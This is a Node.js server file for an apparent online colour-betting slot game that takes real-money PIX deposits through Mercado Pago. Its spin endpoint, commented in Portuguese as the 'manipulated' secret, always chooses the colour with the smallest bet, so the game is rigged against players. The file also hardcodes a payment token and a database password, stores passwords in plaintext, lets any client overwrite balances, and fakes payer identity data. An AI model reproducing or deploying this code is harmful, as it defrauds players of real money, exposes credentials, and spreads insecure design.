const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
const https = require('https');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// --- CONFIGURAÇÃO ---
const MP_TOKEN = "APP_USR-480319563212549-011210-80973eae502f42ff3dfbc0cb456aa930-485513741".trim();
const MONGO_URI = "mongodb+srv://SlotReal:A1l9a9n7@cluster0.ap7q4ev.mongodb.net/SlotGame?retryWrites=true&w=majority";

mongoose.connect(MONGO_URI).then(() => console.log("✅ SISTEMA ONLINE E MANIPULADO"));

const User = mongoose.models.User || mongoose.model('User', new mongoose.Schema({
    user: { type: String, unique: true },
    pass: String,
    email: String,
    saldo: { type: Number, default: 0.00 },
    ganhos: { type: Number, default: 0.00 },
    bets: { type: [Number], default: [0,0,0,0,0,0,0,0,0,0] }
}));

// TIMER DE 2 MINUTOS
let t = 120;
setInterval(() => { if(t > 0) t--; else t = 120; }, 1000);
app.get('/api/tempo-real', (req, res) => res.json({ segundos: t }));

// LOGIN E REGISTRO
app.post('/auth/login', async (req, res) => {
    const c = await User.findOne({ user: req.body.user, pass: req.body.pass });
    if (c) res.json({ success: true, user: c.user, saldo: c.saldo, ganhos: c.ganhos, bets: c.bets });
    else res.json({ success: false, message: "Dados incorretos" });
});

app.post('/auth/register', async (req, res) => {
    try {
        const novo = await User.create({ user: req.body.user, pass: req.body.pass, email: req.body.email });
        res.json({ success: true, user: novo.user, saldo: 0, ganhos: 0, bets: [0,0,0,0,0,0,0,0,0,0] });
    } catch (e) { res.json({ success: false, message: "Usuário já existe" }); }
});

// SALVAR SELEÇÃO
app.post('/api/save-saldo', async (req, res) => {
    await User.findOneAndUpdate({ user: req.body.user }, { saldo: req.body.saldo, bets: req.body.bets });
    res.json({ success: true });
});

// SPIN MANIPULADO (O SEGREDO TÁ AQUI)
app.post('/api/spin', async (req, res) => {
    const u = await User.findOne({ user: req.body.user });
    if (!u) return res.json({ success: false });

    // Acha qual cor tem a MENOR aposta
    let menorValor = Math.min(...u.bets);
    let coresPossiveis = [];
    u.bets.forEach((v, i) => { if (v === menorValor) coresPossiveis.push(i); });

    // Sorteia apenas entre as cores que dão prejuízo zero ou mínimo para a casa
    const alvo = coresPossiveis[Math.floor(Math.random() * coresPossiveis.length)];
    
    const ganho = u.bets[alvo] * 5;
    const nS = Number((u.saldo + ganho).toFixed(2));
    const nG = Number((u.ganhos + ganho).toFixed(2));

    await User.findOneAndUpdate({ user: u.user }, { saldo: nS, ganhos: nG, bets: [0,0,0,0,0,0,0,0,0,0] });
    res.json({ success: true, corAlvo: alvo, novoSaldo: nS, novoGanhos: nG });
});

// MERCADO PAGO
app.post('/gerar-pix', (req, res) => {
    const postData = JSON.stringify({
        transaction_amount: Number(req.body.valor),
        description: `Dep_${req.body.userLogado}`,
        payment_method_id: "pix",
        payer: { email: `${req.body.userLogado}@gmail.com`, first_name: req.body.userLogado, last_name: "User", identification: { type: "CPF", number: "19119119100" } }
    });
    const options = {
        hostname: 'api.mercadopago.com', path: '/v1/payments', method: 'POST',
        headers: { 'Authorization': `Bearer ${MP_TOKEN}`, 'Content-Type': 'application/json' }
    };
    const mpReq = https.request(options, (mpRes) => {
        let b = ''; mpRes.on('data', d => b += d);
        mpRes.on('end', () => {
            const r = JSON.parse(b);
            res.json({ success: true, imagem_qr: r.point_of_interaction.transaction_data.qr_code_base64, copia_e_cola: r.point_of_interaction.transaction_data.qr_code });
        });
    });
    mpReq.write(postData); mpReq.end();
});

app.listen(process.env.PORT || 10000);
